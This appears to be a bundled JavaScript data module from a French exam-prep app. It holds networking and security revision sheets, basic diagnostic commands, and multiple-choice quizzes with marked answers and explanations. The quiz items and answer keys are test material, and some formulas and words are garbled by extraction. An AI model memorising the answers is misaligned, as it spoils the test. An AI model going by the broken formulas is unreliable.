    1xx : Informationnel
    2xx : Succès (200 OK, 201 Created, 204 No Content)
    3xx : Redirection (301 Moved Permanently, 304 Not Modified)
    4xx : Erreur client (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
    5xx : Erreur serveur (500 Internal Server Error, 503 Service Unavailable)

❖ Définition
HTTPS (HTTP Secure) : HTTP + chiffrement TLS/SSL sur le port 443.
TLS Handshake : échange de clés, certificats, négociation d'algorithmes → canal chiffré

  8|                Sécurité des Réseaux`},{id:"8.1",c:8,t:"Notions fondamentales",x:`❖ Définition
  Les 3 piliers de la sécurité (CIA Triad) :
      Confidentialité : seules les personnes autorisées accèdent à l'information
      Intégrité : l'information n'est pas altérée de manière non autorisée
      Disponibilité (Availability) : l'information est accessible quand nécessaire

  ➔ Résumé rapide Types d'attaques

      Attaque             Description
      DoS/DDoS            Saturation du service / distribué
      Man-in-the-Middle   Interception de communications
      ARP Poisoning       Falsification de la table ARP
      DNS Spoofing         Falsification des réponses DNS
      SQL Injection       Injection de code SQL dans les requêtes
      Phishing            Hameçonnage (usurpation d'identité)
      Brute Force         Essai systématique de mots de passe
      Replay Attack       Rejeu de paquets capturés`},{id:"8.2",c:8,t:"Pare-feu et VPN",x:`❖ Définition
  Pare-feu (Firewall) : dispositif qui filtre le trafic réseau selon des règles.
     Stateless : filtre chaque paquet indépendamment (selon IP/port)
     Stateful : suit l'état des connexions (plus sécurisé)
     Application (couche 7) : inspecte le contenu (proxy, WAF)
     DMZ (Zone Démilitarisée) : réseau intermédiaire pour serveurs publics

  ❖ Définition
  VPN (Virtual Private Network) : tunnel chiffré sur un réseau public.
     Site-à-site : connecte deux réseaux distants (IPsec)
     Client-to-site : accès distant d'un utilisateur (SSL/TLS, OpenVPN)
     IPsec : protocole de chiffrement au niveau IP
     IKE/ISAKMP : négociation des clés IPsec`},{id:"8.3",c:8,t:"Cryptographie appliquée aux réseaux",x:`8.3. CRYPTOGRAPHIE APPLIQUÉE AUX RÉSEAUX

➔ Résumé rapide Algorithmes de chiffrement courants

 Type          Algorithme             Usage
 Symétrique    AES (128/256 bits)     Chiffrement de données
 Symétrique    DES, 3DES              Obsolète
 Asymétrique   RSA (2048+ bits)       Échange de clés, signatures
 Asymétrique   ECDSA, Die-Hellman    Échange de clés
 Hachage       SHA-256, SHA-3         Intégrité
 Hachage       MD5                    Obsolète (collision possible)

★ Astuce Concours
TLS 1.3 (2018) : supprime les algorithmes faibles (RC4, DES, MD5, SHA-1), impose Perfect
Forward Secrecy. C'est la version recommandée aujourd'hui. SSL est obsolète !

  9|             Réseaux Sans-Fil (Wi-Fi)`},{id:"9.1",c:9,t:"Standards IEEE 802.11",x:`➔ Résumé rapide Standards Wi-Fi

      Standard Nom Wi-Fi Fréquence           Débit max
      802.11b    Wi-Fi 1     2.4 GHz         11 Mbps
      802.11a    Wi-Fi 2     5 GHz           54 Mbps
      802.11g    Wi-Fi 3     2.4 GHz         54 Mbps
      802.11n    Wi-Fi 4     2.4/5 GHz       600 Mbps
      802.11ac   Wi-Fi 5     5 GHz           6.9 Gbps
      802.11ax   Wi-Fi 6     2.4/5/6 GHz     9.6 Gbps
      802.11be   Wi-Fi 7     2.4/5/6 GHz     46 Gbps

  ❍ Note
  Canaux Wi-Fi 2.4 GHz : 13 canaux (France), seuls 1, 6 et 11 sont non-chevauchants.
  Canaux Wi-Fi 5 GHz : plus nombreux, pas de chevauchement entre canaux non-adjacents.
  OFDMA (Wi-Fi 6) : multiple utilisateurs sur le même canal simultanément.`},{id:"9.2",c:9,t:"Sécurité Wi-Fi",x:`➔ Résumé rapide Protocoles de sécurité Wi-Fi

      Protocole Chiffrement Longueur clé            Statut
      WEP        RC4          40/104 bits          Obsolète (cassé)
      WPA        TKIP         128 bits             Faible
      WPA2       AES-CCMP     128/256 bits         Standard actuel
      WPA3       AES-GCMP     128/192/256 bits     Recommandé

  ❖ Définition
  Modes d'authentification Wi-Fi :
     Personal (PSK) : clé pré-partagée, usage domestique
     Enterprise (802.1X) : authentification via serveur RADIUS, usage professionnel

  10 |          Technologies WAN et Cloud`},{id:"10.1",c:10,t:"Technologies WAN",x:`➔ Résumé rapide Technologies WAN

   Technologie Débit               Caractéristique
   DSL (ADSL)      24/1 Mbps       Ligne téléphonique cuivre
   VDSL            100/10 Mbps     Courte distance
   Fibre FTTH      1 Gbps+         Fibre jusqu'au domicile
   4G LTE          150 Mbps        Mobile
   5G              20 Gbps         Mobile ultra-rapide
   MPLS            Variable        Réseau privé entreprise`},{id:"10.2",c:10,t:"Cloud Computing",x:`➔ Résumé rapide Modèles de service Cloud

   Modèle Nom                               Exemple
   IaaS       Infrastructure as a Service   AWS EC2, Azure VM
   PaaS       Platform as a Service         Heroku, Google App Engine
   SaaS       Software as a Service         Gmail, Oce 365

  ★ Astuce Concours
  Analogie pour retenir IaaS/PaaS/SaaS :
  IaaS = terrain vide (vous construisez tout)
  PaaS = appartement brut (structure fournie, vous décorez)
  SaaS = hôtel (tout est fourni, vous utilisez)

     11 |       Outils et Commandes Réseau

     ◆ Protocole Commandes réseau essentielles
 1   # Test de connectivite IP
 2   ping 192.168.1.1             # Linux / Windows / Mac
 3   ping -c 4 google . com       # Linux : 4 paquets seulement
 5   # Trace du chemin
 6   traceroute google . com      # Linux / Mac
 7   tracert google . com         # Windows
 9   # Configuration reseau
10   ip addr show                 # Linux : voir les IPs
11   ipconfig / all               # Windows : voir les IPs
12   ifconfig                     # Linux ( ancien )
14   # Table de routage
15   ip route show                # Linux
16   route print                  # Windows
18   # Table ARP
19   arp -a                       # Voir le cache ARP
20   ip neigh                     # Linux moderne
22   # DNS
23   nslookup google . com        # Requete DNS simple
24   dig google . com A           # Linux : requete DNS detaillee
25   dig google . com MX          # Enregistrements mail
27   # Connexions reseau
28   netstat - an                 # Connexions actives et ports
29   ss - tuln                    # Linux : equivalent moderne
31   # Capture de paquets
32   tcpdump -i eth0              # Linux : capturer trafic
33   wireshark                    # Interface graphique
35   # Test de port
36   telnet 192.168.1.1 80       # Tester port TCP
37   nc - zv host port            # Netcat

    Part II

Examens Blancs

★ Astuce Concours
Stratégie pour le jour du concours :
  1. Calculez les adresses réseau et broadcast méthodiquement
  2. Identifiez toujours la couche OSI concernée
  3. Pour les protocoles, retenez : protocole + port + transport (TCP/UDP)
  4. Les questions sur CIDR : convertissez en binaire si nécessaire
  5. Éliminez les réponses évidemment fausses d'abord

 12 |          Examen Blanc 1 — Fondamentaux`},{id:"15.1",c:15,t:"Explications des protocoles et calculs",x:`❍ Note Modèle OSI – 7 couches expliquées

           No Couche             Rôle                                                        PDU
            7    Application     Interface utilisateur (HTTP, FTP, DNS, SMTP)                Données
            6    Présentation    Encodage, chiffrement, compression                           Données
            5    Session         Gérer les sessions (ouverture, maintien, fermeture)         Données
            4    Transport       Fiabilité bout-à-bout (TCP/UDP). Ports.                     Segment
            3    Réseau          Adressage logique (IP), routage                             Paquet
            2    Liaison         Adressage physique (MAC), détection d'erreurs               Trame
            1    Physique        Bits sur le média (câble, fibre, ondes)                      Bits

  Mnémotechnique (haut → bas) : All People Seem To Need Data Processing.

  ❍ Note Calcul de sous-réseaux – Méthode
  Données : Adresse IP 192.168.1.0/26
  Étapes :
       1. /26 ⇒ 26 bits réseau, 32 − 26 = 6 bits hôte.
       2. Nombre total d'adresses = 2
                                        6 = 64.

       3. Adresses utilisables = 64 − 2 = 62 (on retire réseau et broadcast).
       4. Masque : /26 ⇒ 255.255.255.192 (256 − 64 = 192).
       5. Sous-réseaux : 192.168.1.0—63, 192.168.1.64—127, 192.168.1.128—191, 192.168.1.192—255.
  Formule : Hôtes utilisables = 232−n − 2 (où n = préfixe CIDR).

  ❍ Note TCP vs UDP – Tableau comparatif

                     TCP                                    UDP
                     Connecté (handshake)                   Sans connexion
                     Fiable (accusés de réception)          Non fiable (best-effort)
                     Ordonné       (numéros       de        Pas d'ordre garanti
                     séquence)
                     Lent (overhead)                        Rapide (léger)
                     HTTP, FTP, SSH, SMTP                   DNS    (53),     DHCP,   VoIP,
                                                            streaming`},{id:"15.2",c:15,t:"Définitions Réseaux à mémoriser",x:`15.2. DÉFINITIONS RÉSEAUX À MÉMORISER

  ❖ Définition Glossaire Réseaux

   Terme                     Définition
   Hub                       Répéteur L1 : diffuse à tous les ports. Pas d'intelligence.
   Switch                    Commutateur L2 : transmet selon les adresses MAC. Table MAC.
   Routeur                   L3 : transfère les paquets selon les adresses IP. Tables de routage.

   Adresse MAC               Adresse physique unique (48 bits, ex: AA:BB:CC:DD:EE:FF).
   Adresse IP                Adresse logique (IPv4 = 32 bits, IPv6 = 128 bits).
   Masque                    Définit la partie réseau et la partie hôte de l'adresse IP.

   ARP                       Résout IP → MAC sur le réseau local.
   DNS                       Résout nom de domaine → adresse IP. Port 53.
   DHCP                      Attribue automatiquement une configuration IP. Processus DORA.
   NAT                       Traduit les adresses privées en adresses publiques (et vice versa).

   TCP                       Transport fiable, connecté, ordonné. Handshake 3 voies.
   UDP                       Transport non fiable, sans connexion, rapide.
   ICMP                      Messages de contrôle (ping, traceroute).

   RIP                       Routage à vecteur de distance (nombre de sauts, max 15).
   OSPF                      Routage à état de liens (coût, algorithme de Dijkstra).`},{id:"15.3",c:15,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 20 règles d'or Réseaux
       1. OSI : 7 couches (Ph—Li—Ré—Tr—Se—Pr—Ap). Hub=L1, Switch=L2, Routeur=L3.
       2. TCP/IP : 4 couches (Accès Réseau, Internet, Transport, Application).
       3. Adresses privées : 10.x.x.x/8, 172.16-31.x.x/12, 192.168.x.x/16.
       4. Hôtes par sous-réseau : 2
                                   32−n − 2.

       5. Adresse réseau : bits hôte à 0. Broadcast : bits hôte à 1.
       6. TCP : SYN → SYN-ACK → ACK (3-way handshake).
       7. DHCP : Discover → Offer → Request → Ack (DORA).
       8. Shannon : C = B log2 (1 + S/N ). Nyquist : D = 2B log2 M .
       9. DNS=53, HTTP=80, HTTPS=443, SSH=22, FTP=21, SMTP=25.
   10. DHCP=67/68, POP3=110, IMAP=143, MySQL=3306, RDP=3389.
   11. Le TTL évite les boucles : décrémenté à chaque routeur, paquet détruit quand TTL=0.
   12. ARP fonctionne uniquement sur le réseau local (broadcast L2).
   13. IPv6 = 128 bits, pas de broadcast (multicast à la place), pas de NAT nécessaire.
   14. VLAN : segmentation logique du réseau. Les trames restent dans le VLAN.
   15. WEP = obsolète et cassé. WPA2 = standard actuel. WPA3 = récent.
   16. Le routage choisit toujours le préfixe le   plus spécifique (longest prefix match).
   17. RIP : max 15 sauts, convergence lente. OSPF : coût, convergence rapide.
   18. CSMA/CD : Ethernet filaire (détecter collision). CSMA/CA : Wi-Fi (éviter collision).
   19. Un port identifie un     service (processus), pas un hôte.
   20. NAT permet à plusieurs machines internes de partager une seule IP publique.`},{id:"15.4",c:15,t:"Pièges fréquents au concours",x:`15.4. PIÈGES FRÉQUENTS AU CONCOURS

☞ Attention / Piège 10 pièges classiques Réseaux

  1. Confondre adresse MAC (L2, physique) et adresse IP (L3, logique).
  2. Oublier de soustraire 2 dans le calcul d'hôtes (2
                                                         32−n au lieu de 232−n − 2).

  3. Confondre un switch (L2, MAC) et un routeur (L3, IP).
  4. Croire que TCP est «plus rapide» qu'UDP (c'est l'inverse).
  5. Confondre /24 (256 adresses) et /25 (128 adresses).
  6. DNS utilise UDP par défaut (port 53), pas TCP (sauf pour les transferts de zone).
  7. HTTPS n'est PAS un protocole séparé : c'est HTTP + TLS.
  8. Un hub ne filtre rien : il diffuse à   tous les ports (collision domain unique).
  9. Le masque /31 donne 0 hôte utilisable (cas spécial point-à-point).
 10. DHCP=67 (serveur) et 68 (client). Ne pas confondre les deux ports.`}],dh=[{q:"À quelle couche du modèle OSI opère un commutateur (switch) Ethernet standard ?",o:["Couche 1 (Physique)","Couche 2 (Liaison de données)","Couche 3 (Réseau)","Couche 4 (Transport)"],a:1,e:"Réponse : B) Couche 2 (Liaison de données) Un switch standard utilise les adresses MAC pour commuter les trames, ce qui correspond à la couche 2.  A : Le hub est couche 1 (diffuse tout en bits)  B : Le switch est couche 2 (commute par adresse MAC) ✓  C : Le routeur est couche 3 (route par adresse IP)  D : TCP/UDP sont couche 4 Un switch de couche 3 existe aussi (multilayer switch) mais peut router les paquets IP."},{q:"Quelle est la plage d'adresses IP privées de classe B ?",o:["10.0.0.0 — 10.255.255.255","172.16.0.0 — 172.31.255.255","192.168.0.0 — 192.168.255.255","169.254.0.0 — 169.254.255.255"],a:1,e:"Réponse : B) 172.16.0.0 — 172.31.255.255 Adresses privées (RFC 1918) :  A : Classe A privée : 10.0.0.0/8  B : Classe B privée : 172.16.0.0/12 (172.16.x.x à 172.31.x.x) ✓  C : Classe C privée : 192.168.0.0/16  D : APIPA (auto-configuration sans DHCP), pas une plage privée RFC1918"},{q:"Combien d'hôtes utilisables contient le réseau 10.0.0.0/22 ?",o:["512","1022","1024","2046"],a:1,e:"Réponse : B) 1022 /22 signifie 22 bits de masque, donc 32 − 22 = 10 bits pour les hôtes. 210 = 1024 adresses totales. On retire l'adresse réseau (0) et le broadcast (1023) : 1024 − 2 = 1022 hôtes.  A (512) : correspond à /23 (29 − 2 = 510), pas /22  C (1024) : total sans retirer les adresses réservées  D (2046) : correspond à /21 (211 − 2 = 2046)"},{q:"Quel protocole utilise le port 53 en UDP ?",o:["HTTP","DHCP","DNS","FTP"],a:2,e:"Réponse : C) DNS  HTTP : port 80 (TCP)  DHCP : ports 67/68 (UDP)  DNS : port 53 (UDP pour les requêtes, TCP pour les transferts de zone) ✓  FTP : ports 20/21 (TCP)"},{q:"Combien de segments sont échangés lors d'un Three-Way Handshake TCP ?",o:["2","3","4","6"],a:1,e:"Réponse : B) 3 Le Three-Way Handshake comprend exactement 3 segments : 1. Client → Serveur : SYN 2. Serveur → Client : SYN-ACK 3. Client → Serveur : ACK La terminaison de connexion (Four-Way) utilise 4 segments (FIN, ACK, FIN, ACK)."},{q:"Quelle adresse de sous-réseau contient l'IP 192.168.10.200/27 ?",o:["192.168.10.192","192.168.10.196","192.168.10.200","192.168.10.224"],a:0,e:"Réponse : A) 192.168.10.192 /27 = masque 255.255.255.224. Blocs de 2 5 = 32 adresses. 192, 224. Sous-réseaux du 4ème octet : 0, 32, 64, 96, 128, 160, 192—223 (192+32-1=223). 200 est dans le bloc Adresse réseau = 192.168.10.192, broadcast = 192.168.10.223."},{q:"Quel est le rôle du protocole ARP ?",o:["Traduire un nom de domaine en adresse IP","Traduire une adresse IP en adresse MAC","Attribuer une adresse IP dynamiquement","Chiffrer les communications réseau"],a:1,e:"Réponse : B) Traduire une adresse IP en adresse MAC  A : C'est le rôle de DNS  B : ARP (Address Resolution Protocol) résout IP → MAC ✓  C : C'est le rôle de DHCP  D : C'est le rôle de TLS/SSL, IPsec NB : le protocole inverse (MAC → IP) s'appelle RARP (ou BOOTP/DHCP moderne)."},{q:"Comment appelle-t-on l'unité de données de protocole (PDU) au niveau de la couche Transport ?",o:["Bit","Trame","Paquet","Segment"],a:3,e:"Réponse : D) Segment PDU selon la couche OSI :  Couche 1 (Physique) : Bit  Couche 2 (Liaison) : Trame (Frame)  Couche 3 (Réseau) : Paquet (Packet)  Couche 4 (Transport) : Segment (TCP) ou Datagramme (UDP) ✓  Couches 5-7 (Application) : Message / Données"},{q:"Quelle est la valeur maximale de sauts autorisée par le protocole RIP ?",o:["8","15","16","255"],a:1,e:"Réponse : B) 15 RIP (Routing Information Protocol) limite le nombre de sauts à 15 maximum. Une métrique de 16 signifie «réseau inaccessible» (infini). C'est pourquoi RIP n'est pas adapté aux grands réseaux. OSPF n'a pas cette limite (il utilise le coût basé sur la bande passante)."},{q:"Parmi ces protocoles de sécurité Wi-Fi, lequel est considéré comme    obsolète et vulnérable ?",o:["WPA2","WPA3","WEP","AES"],a:2,e:"Réponse : C) WEP  WPA2 : standard actuel, utilise AES-CCMP, encore sécurisé  WPA3 : le plus sécurisé, récent (2018)  WEP : utilisé RC4, facilement cassé en quelques minutes ✓  AES : un algorithme de chiffrement, pas un protocole Wi-Fi"},{q:`Un canal a une bande passante de 4 000 Hz et un SNR de 20 dB. Quelle est sa capacité maximale
(Shannon) ?`,o:["26 633 bps","40 000 bps","80 000 bps","8 000 bps"],a:0,e:"Réponse : A) 26 633 bps S SN RdB = 20 dB ⇒ N = 1020/10 = 100 C = B × log2 (1 + S/N ) = 4000 × log2 (101) log2 (101) ≈ 6.6582 C ≈ 4000 × 6.6582 = 26 633 bps."},{q:"Dans quelle séquence DHCP le serveur envoie-t-il son offre d'adresse IP ?",o:["Discover","Offer","Request","Acknowledge"],a:1,e:"Réponse : B) Offer La séquence DORA : 1. Discover : envoyé par le client (broadcast) 2. Offer : envoyé par le serveur avec l'IP proposée ✓ 3. Request : envoyé par le client pour accepter 4. Acknowledge : envoyé par le serveur pour confirmer"},{q:"Quelle topologie offre la meilleure tolérance aux pannes mais au coût le plus élevé ?",o:["Bus","Étoile","Maillage complet","Anneau"],a:2,e:"Réponse : C) Maillage complet  Bus : une panne du bus coupe tout le réseau  Étoile : panne du concentrateur central = panne totale  Maillage complet : chaque n÷ud est connecté à tous les autres, n(n−1) 2 liens, très coûteux mais très résilient ✓  Anneau : une panne coupe le cercle (sauf double-anneau)"},{q:"Quelle méthode HTTP est utilisée pour   modifier partiellement une ressource ?",o:["POST","PUT","PATCH","DELETE"],a:2,e:"Réponse : C) PATCH  POST : création d'une nouvelle ressource  PUT : remplacement complet d'une ressource existante  PATCH : modification partielle d'une ressource ✓  DELETE : suppression d'une ressource"},{q:"Quelle est l'équivalent IPv6 de l'adresse de loopback IPv4 127.0.0.1 ?",o:["FF00::1","FE80::1","::1","0::0"],a:2,e:"Réponse : C) ::1  FF00::1 : adresse multicast  FE80::1 : adresse link-local (auto-configurée)  ::1 : loopback IPv6 (=équivalent de 127.0.0.1 en IPv4) ✓  0::0 ou :: : adresse non spécifiée (=équivalent de 0.0.0.0)"},{q:"Quel standard définit le marquage VLAN dans les trames Ethernet ?",o:["IEEE 802.3","IEEE 802.1Q","IEEE 802.11","IEEE 802.1X"],a:1,e:"Réponse : B) IEEE 802.1Q  802.3 : Ethernet (standard général)  802.1Q : marquage VLAN (ajout d'un tag de 4 octets dans la trame) ✓  802.11 : Wi-Fi  802.1X : authentification port-based (EAP/RADIUS) Le tag 802.1Q contient un VLAN ID (12 bits, valeurs 1-4094) et une priorité (CoS, 3 bits)."},{q:`Quel type de NAT permet à plusieurs machines privées de partager une seule adresse IP publique
?`,o:["NAT statique","NAT dynamique","PAT (NAT Overload)","Reverse NAT"],a:2,e:"Réponse : C) PAT (NAT Overload)  NAT statique : 1 privée ↔ 1 publique (bijection fixe)  NAT dynamique : pool d'adresses publiques (pas assez)  PAT (Port Address Translation) : multiple privées → 1 publique, différenciées par les numéros de port ✓  Utilisé dans tous les routeurs domestiques (box internet) 13 | Examen Blanc 2 — Approfondissement"},{q:"Quel algorithme utilise OSPF pour calculer les meilleures routes ?",o:["Bellman-Ford","Dijkstra","Floyd-Warshall","Kruskal"],a:1,e:"Réponse : B) Dijkstra  Bellman-Ford : utilisé par RIP et BGP  Dijkstra : utilisé par OSPF et ISIS (plus court chemin) ✓  Floyd-Warshall : tous les plus courts chemins (non utilisé en routage)  Kruskal : arbre couvrant minimal (non utilisé en routage) OSPF construit une base de données d'état de lien (LSDB) puis applique Dijkstra."},{q:"Dans quel ordre correct les en-têtes sont-ils ajoutés lors de l'envoi d'une requête HTTP ?",o:["HTTP → Ethernet → IP → TCP","HTTP → IP → TCP → Ethernet","HTTP → TCP → IP → Ethernet","TCP → HTTP → IP → Ethernet"],a:2,e:"Réponse : C) HTTP → TCP → IP → Ethernet L'encapsulation suit les couches OSI de haut en bas : 1. Données HTTP (couche 7) 2. + En-tête TCP (couche 4) → segment 3. + En-tête IP (couche 3) → paquet 4. + En-tête Ethernet (couche 2) → trame 5. Transmission en bits (couche 1)"},{q:`Vous devez créer au moins 6 sous-réseaux à partir du réseau 172.16.0.0/16, chacun pouvant
contenir au moins 1000 hôtes. Quel est le préfixe le plus long qui respecte ces deux contraintes ?`,o:["/22","/24","/23","/21"],a:0,e:"Réponse : A) /22 Pour 1000 hôtes minimum : 2 − 2 ≥ 1000 ⇒ n ≥ 10 bits pour les hôtes. n Donc le masque maximum est /22 (32-10=22 bits de masque, 2 10 − 2 = 1022 hôtes). Pour 6 sous-réseaux dans /16 : 2 m ≥ 6 ⇒ m ≥ 3 bits supplémentaires. /16 + 3 bits = /19 (2 13 − 2 = 8190 hôtes, 8 sous-réseaux) — possible mais trop grand. /22 avec /16 : 6 bits pris = 2 6 = 64 sous-réseaux, 1022 hôtes chacun — correct ✓."},{q:`Un paquet IP a un TTL initial de 64. Il traverse 3 routeurs avant d'arriver à destination. Quel
est le TTL à l'arrivée ?`,o:["60","61","63","64"],a:1,e:"Réponse : B) 61 Chaque routeur décrémente le TTL de 1. 64 − 3 = 61 Si le TTL atteint 0, le routeur élimine le paquet et envoie un message ICMP «Time Exceeded». Nota : les switches (couche 2) ne modifient pas le TTL."},{q:"Quel protocole de transport utilise le streaming vidéo en temps réel (ex: appel vidéo) ?",o:["TCP uniquement","UDP principalement","ICMP","ARP"],a:1,e:"Réponse : B) UDP principalement Le streaming vidéo en temps réel (VoIP, vidéoconférence, jeux) utilise UDP car :  Faible latence (pas de retransmission)  Une trame perdue est préférable à une trame retardée  TCP est trop lent (handshake, accusés de réception, retransmission) Protocoles associés : RTP (Real-time Transport Protocol) sur UDP, RTCP pour le contrôle."},{q:"Quelle est la taille   maximale des données (payload) dans une trame Ethernet standard ?",o:["1024 octets","1500 octets","1518 octets","9000 octets"],a:1,e:"Réponse : B) 1500 octets  MTU Ethernet (Maximum Transmission Unit) = 1500 octets de données (payload) ✓  1518 octets = taille totale de la trame (1500 + 14 en-tête + 4 FCS)  9000 octets = Jumbo Frame (optionnel, non standard, pour les datacenters) Si un paquet IP dépasse 1500 octets, il sera fragmenté par le protocole IP."},{q:"Quel type d'enregistrement DNS est utilisé pour définir le serveur de messagerie d'un domaine ?",o:["A","CNAME","MX","PTR"],a:2,e:"Réponse : C) MX  A : adresse IPv4 d'un hôte  CNAME : alias (canonical name)  MX (Mail eXchanger) : spécifie le serveur de messagerie d'un domaine ✓  PTR : résolution inverse (IP → nom)"},{q:"Quels canaux Wi-Fi 2.4 GHz sont     non-chevauchants entre eux ?",o:["1, 5, 9, 13","1, 6, 11","1, 3, 6, 9, 11","2, 6, 10"],a:1,e:"Réponse : B) 1, 6, 11 En 2.4 GHz, chaque canal occupe 22 MHz et les canaux sont espacés de 5 MHz. Seuls les canaux 1, 6 et 11 sont susamment espacés pour ne pas se chevaucher (5 canaux d'écart minimum). C'est pourquoi on configure les points d'accès adjacents sur ces 3 canaux."},{q:"Le protocole HTTPS opère principalement à quelle couche du modèle OSI ?",o:["Couche 3 (Réseau)","Couche 4 (Transport)","Couches 5-6 (Session/Présentation)","Couche 7 (Application)"],a:3,e:"Réponse : D) Couche 7 (Application) HTTPS = HTTP + TLS/SSL.  HTTP : couche 7 (Application)  TLS/SSL : couches 5-6 (Session/Présentation) pour le chiffrement  TCP : couche 4 (Transport) En pratique, on dit que HTTPS opère à la couche Application (7) car c'est un protocole appli- catif. TLS est considéré comme sous-jacent."},{q:"Qu'est-ce qu'une attaque de type ARP Poisoning ?",o:["Saturer le réseau avec des requêtes ARP","Associer une fausse adresse MAC à une adresse IP légitime dans les caches ARP","Chiffrer les messages ARP","Bloquer les requêtes ARP sur un port de switch"],a:1,e:"Réponse : B) Associer une fausse adresse MAC à une adresse IP légitime L'ARP Poisoning (ou ARP Spoofing) consiste à envoyer de fausses réponses ARP pour associer l'adresse MAC de l'attaquant à l'IP d'un autre hôte (ex: la passerelle). Conséquence : l'attaquant intercepte tout le trafic destiné à cette IP (Man-in-the-Middle). Contre-mesures : Dynamic ARP Inspection (DAI) sur les switches, HTTPS."},{q:"Quelle est la métrique utilisée par OSPF pour sélectionner le meilleur chemin ?",o:["Le nombre de sauts","Le délai","Le coût basé sur la bande passante","La distance administrative"],a:2,e:"Réponse : C) Le coût basé sur la bande passante OSPF utilise un coût (cost) = Bande_passante _en_bps ."},{q:"Laquelle de ces adresses est une adresse de   broadcast dirigé pour le réseau 192.168.5.0/24 ?",o:["192.168.5.0","192.168.5.1","192.168.5.255","255.255.255.255"],a:2,e:"Réponse : C) 192.168.5.255  192.168.5.0 : adresse réseau (non attribuable)  192.168.5.1 : première adresse hôte valide (souvent la passerelle)  192.168.5.255 : broadcast dirigé de ce sous-réseau (tous les hôtes du réseau) ✓  255.255.255.255 : broadcast limité (non routablé, reste local)"},{q:`Quelle technologie permet de transmettre des données et de l'électricité sur un même câble Eth-
ernet ?`,o:["VLAN","PoE (Power over Ethernet)","QoS","Spanning Tree"],a:1,e:"Réponse : B) PoE (Power over Ethernet) PoE (IEEE 802.3af/at/bt) permet d'alimenter des dispositifs (téléphones IP, caméras, bornes Wi-Fi) via le câble Ethernet, éliminant le besoin d'une alimentation séparée.  802.3af : jusqu'à 15.4W par port  802.3at (PoE+) : jusqu'à 30W  802.3bt (PoE++) : jusqu'à 100W"},{q:"Quel est le rôle du protocole   STP (Spanning Tree Protocol) dans un réseau commuté ?",o:["Attribuer des adresses IP automatiquement","Éviter les boucles de commutation en bloquant certains ports","Chiffrer le trafic entre les switches","Prioriser le trafic vidéo et voix"],a:1,e:"Réponse : B) Éviter les boucles de commutation STP (IEEE 802.1D) évite les boucles de commutation (broadcast storm) en mettant certains ports en état blocking pour créer un arbre sans boucle (spanning tree). Variantes améliorées : RSTP (802.1w, convergence rapide), MSTP (802.1s, multiple VLANs).  A : rôle de DHCP  C : rôle de MACsec ou IPsec  D : rôle de QoS (Quality of Service)"},{q:`Dans le modèle de service Cloud, quel modèle fournit uniquement l'infrastructure (serveurs, stock-
age, réseau) ?`,o:["SaaS","PaaS","IaaS","FaaS"],a:2,e:"Réponse : C) IaaS  SaaS (Software as a Service) : logiciel complet (Gmail, Oce 365)  PaaS (Platform as a Service) : plateforme de développement (Heroku, App Engine)  IaaS (Infrastructure as a Service) : serveurs/stockage/réseau virtualisés (AWS EC2, Azure VM) ✓  FaaS (Function as a Service) : fonctions serverless (AWS Lambda)"},{q:"Parmi les algorithmes suivants, lequel est un algorithme de   hachage (et non de chiffrement) ?",o:["AES","RSA","SHA-256","DES"],a:2,e:"Réponse : C) SHA-256  AES : chiffrement symétrique (reversible)  RSA : chiffrement asymétrique (reversible)  SHA-256 : fonction de hachage — unidirectionnelle, non reversible ✓  DES : chiffrement symétrique (obsolète) Les fonctions de hachage : SHA-256, SHA-3, MD5 (vulnérable). Elles produisent une empreinte de taille fixe et ne peuvent pas être inversées."},{q:"Quel est le port par défaut utilisé par   SSH ?",o:["21","22","23","443"],a:1,e:"Réponse : B) 22  21 : FTP (contrôle)  22 : SSH (Secure Shell — accès distant chiffré) ✓  23 : Telnet (accès distant non chiffré, obsolète)  443 : HTTPS SSH remplace Telnet car il chiffre toutes les communications. Il utilise TCP/22."},{q:`Un routeur reçoit un paquet destiné à 172.16.5.130.         Sa table de routage contient les entrées
suivantes :   172.16.0.0/16 via 10.0.0.1, 172.16.5.0/24 via 10.0.0.2, 172.16.5.128/25 via 10.0.0.3,
0.0.0.0/0 via 10.0.0.4. Quelle route sélectionnera-t-il ?`,o:["Via 10.0.0.1","Via 10.0.0.2","Via 10.0.0.3","Via 10.0.0.4"],a:2,e:"Réponse : C) Via 10.0.0.3 Principe du Longest Prefix Match (LPM) : le routeur choisit la route avec le masque le plus long (plus spécifique). 1. 172.16.0.0/16 : 172.16.5.130 appartient (/16) — 16 bits de correspondance 2. 172.16.5.0/24 : 172.16.5.130 appartient (/24) — 24 bits de correspondance 3. 172.16.5.128/25 : 172.16.5.128 à 172.16.5.255. 130 ∈ [128,255] — 25 bits ✓ 4. 0.0.0.0/0 : route par défaut (0 bits) — utilisée en dernier recours 14 | Mémo de dernière minute ➔ Résumé rapide Ports à connaître par c÷ur Port Protocole Port Protocole 20 FTP (data) 80 HTTP 21 FTP (control) 110 POP3 22 SSH 143 IMAP 23 Telnet 443 HTTPS 25 SMTP 3306 MySQL 53 DNS 3389 RDP 67/68 DHCP 5432 PostgreSQL"}],G2={id:oh,name:lh,color:uh,sections:ch,quiz:dh},X2=Object.freeze(Object.defineProperty({__proto__:null,color:uh,default:G2,id:oh,name:lh,quiz:dh,sections:ch},Symbol.toStringTag,{value:"Module"})),ph="secu",mh="Sécurité",fh="#f87171",hh=[{id:"1.1",c:1,t:"Triade CIA",x:`❖ Définition
  La    triade CIA est le fondement de toute politique de sécurité :
   Confidentialité : seules les personnes autorisées accèdent à l'information
   Intégrité : l'information n'est pas altérée de manière non autorisée
   Disponibilité (Availability) : l'information est accessible quand nécessaire
  Extension :      CIA + AAA (Authentication, Authorization, Accounting)

  ➔ Résumé rapide Concepts de base

      Terme               Définition
      Vulnérabilité       Faiblesse d'un système exploitable
      Menace (Threat)     Danger potentiel pouvant exploiter une vuln.
      Risque              Probabilité × Impact d'une menace
      Exploit             Code/technique exploitant une vulnérabilité
      Attaque             Action concrète visant à compromettre un système
      Contre-mesure       Mécanisme réduisant un risque
      Zero-day            Vuln. inconnue du fabricant (0 jour de correction)
      CVE                 Common Vulnerabilities and Exposures (base mondiale)
      CVSS                Common Vulnerability Scoring System (score 0-10)`},{id:"1.2",c:1,t:"Types d'attaquants",x:`➔ Résumé rapide Profils d'attaquants

      Type             Nom              Motivation
      White Hat        Hacker éthique   Sécurité, pen test légal
      Black Hat        Cybercriminel    Gain financier, sabotage
      Grey Hat         Intermediaire    Variable
      Script Kiddie    Débutant         Curiosité, outils préfabriqués
      Hacktivist       Militant         Causes politiques/sociales
